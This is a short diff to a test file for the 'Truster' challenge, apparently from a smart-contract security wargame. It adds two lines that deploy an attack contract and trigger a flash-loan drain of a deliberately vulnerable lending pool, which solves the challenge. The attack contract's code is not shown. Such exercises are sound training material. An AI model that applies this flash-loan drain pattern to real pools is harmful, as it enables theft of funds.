@@ -18,6 +18,8 @@ describe('[Challenge] Truster', function () {
     expect(await token.balanceOf(player)).to.equal(0);
 
     /** CODE YOUR SOLUTION HERE */
+    const attack = await (await ethers.getContractFactory('TrusterAttack', player)).deploy(pool, token);
+    await attack.excuteFlashLoan();
 
     /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
 
